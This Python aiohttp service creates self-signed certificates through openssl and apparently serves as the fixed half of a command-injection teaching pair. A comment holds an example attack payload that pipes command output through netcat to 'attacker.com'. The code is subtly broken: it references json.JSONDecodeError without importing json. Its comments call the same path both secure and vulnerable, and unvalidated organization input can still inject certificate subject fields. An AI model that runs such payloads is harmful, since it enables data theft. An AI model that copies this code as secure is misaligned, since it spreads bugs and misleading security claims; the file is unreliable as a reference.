import os
import sqlite3
import logging
import asyncio
import uuid
from datetime import datetime
from aiohttp import web

# Configure logging for the Async SSL Provisioning Service
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - SSLProvisioner - %(levelname)s - %(message)s'
)
logger = logging.getLogger("AiohttpCertAPI")

DB_FILE = "ssl_provisioning.db"
CERT_DIR = "/tmp/ssl_certs"
API_HOST = "0.0.0.0"
API_PORT = 8080

def init_tracking_db():
    """Initializes the SQLite database to track SSL certificate issuance."""
    if not os.path.exists(CERT_DIR):
        os.makedirs(CERT_DIR, exist_ok=True)
        
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE cert_jobs (
            job_id TEXT PRIMARY KEY,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            domain TEXT NOT NULL,
            organization TEXT NOT NULL,
            status TEXT NOT NULL,
            details TEXT
        )
    ''')
    
    mock_history = [
        ('job_a1b2', 'internal.local', 'IT Dept', 'SUCCESS', 'Cert generated.'),
        ('job_c3d4', 'dev.local', 'Engineering', 'FAILED', 'Missing parameters.')
    ]
    cursor.executemany('''
        INSERT INTO cert_jobs (job_id, domain, organization, status, details)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("SSL Provisioning audit database initialized.")

def log_cert_job(job_id: str, domain: str, org: str, status: str, details: str):
    """Records the outcome of a certificate generation request."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO cert_jobs (job_id, domain, organization, status, details) VALUES (?, ?, ?, ?, ?)",
            (job_id, domain, org, status, details)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Failed to log certificate job {job_id}: {e}")

async def execute_cert_generation(job_id: str, domain: str, organization: str) -> tuple[bool, str]:
    """
    SECURE: Uses asyncio.create_subprocess_exec and a command list to prevent Command Injection.
    """
    logger.info(f"Generating secure SSL certificate for {domain} (Org: {organization})")
    
    key_path = os.path.join(CERT_DIR, f"{job_id}.key")
    cert_path = os.path.join(CERT_DIR, f"{job_id}.crt")
    
    # Secure: Commands are defined as lists of arguments. This removes shell processing
    # and ensures the untrusted organization field is passed safely as a direct argument.
    command_args = [
        "openssl",
        "req",
        "-new",
        "-newkey", "rsa:2048",
        "-days", "365",
        "-nodes",
        "-x509",
        "-keyout", key_path,
        "-out", cert_path,
        "-subj", f"/C=US/ST=CA/L=SF/O={organization}/CN={domain}"
    ]
    
    try:
        logger.debug(f"Executing secure async system command: {command_args}")
        
        # create_subprocess_exec executes the program directly without invoking the system shell (/bin/sh).
        # We unpack the command_args list into positional arguments using *command_args.
        process = await asyncio.create_subprocess_exec(
            *command_args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        # Using asyncio to prevent blocking the event loop during generation
        stdout_bytes, stderr_bytes = await asyncio.wait_for(process.communicate(), timeout=20.0)
        
        if process.returncode == 0:
            logger.info(f"Certificate successfully generated for {domain}.")
            return True, "Certificate generated successfully."
        else:
            logger.error(f"OpenSSL process failed. Return code: {process.returncode}")
            # Masking raw stderr back to the caller prevents attackers from seeing the output 
            # of potential underlying system errors.
            return False, "OpenSSL certificate generation failed."
            
    except asyncio.TimeoutError:
        logger.error(f"Certificate generation timed out for {domain}.")
        return False, "Process timed out after 20 seconds."
    except FileNotFoundError as e:
        logger.error(f"OpenSSL binary not found: {e}")
        return False, "Required SSL utility missing from environment."
    except Exception as e:
        logger.error(f"Critical error during certificate generation: {e}")
        return False, "Internal system error during generation."
async def handle_generate_request(request: web.Request) -> web.Response:
    """Aiohttp handler for POST /api/v1/certificates"""
    try:
        if not request.can_read_body:
            return web.json_response({"error": "Missing JSON payload"}, status=400)
            
        payload = await request.json()
        
        domain = payload.get("domain")
        # Extract the vulnerable field from the JSON body
        organization = payload.get("organization", "DefaultOrg")
        
        if not domain:
            return web.json_response({"error": "Missing 'domain' in payload"}, status=400)
            
        job_id = str(uuid.uuid4())
        
        # Pass the untrusted 'organization' string to the vulnerable async function
        success, message = await execute_cert_generation(job_id, domain, organization)
        
        if success:
            log_cert_job(job_id, domain, organization, "SUCCESS", message)
            return web.json_response({
                "status": "success",
                "job_id": job_id,
                "message": message,
                "cert_url": f"/certs/{job_id}.crt"
            }, status=201)
        else:
            log_cert_job(job_id, domain, organization, "FAILED", message)
            return web.json_response({
                "status": "error",
                "error": "Failed to generate certificate",
                "details": message
            }, status=500)
            
    except json.JSONDecodeError:
        return web.json_response({"error": "Malformed JSON"}, status=400)
    except Exception as e:
        logger.error(f"API Error: {e}")
        return web.json_response({"error": "Internal Server Error"}, status=500)

async def init_app() -> web.Application:
    """Configures the aiohttp application routes."""
    init_tracking_db()
    
    app = web.Application()
    app.router.add_post('/api/v1/certificates', handle_generate_request)
    
    logger.info(f"Aiohttp SSL Provisioning API listening on http://{API_HOST}:{API_PORT}")
    
    # Example Malicious Payload exploiting the aiohttp JSON route:
    # curl -X POST http://127.0.0.1:8080/api/v1/certificates \
    #      -H "Content-Type: application/json" \
    #      -d '{"domain": "test.local", "organization": "EvilCorp/CN=test\" ; id | nc attacker.com 4444 ; echo \""}'
    
    return app

if __name__ == "__main__":
    web.run_app(init_app(), host=API_HOST, port=API_PORT, access_log=None)
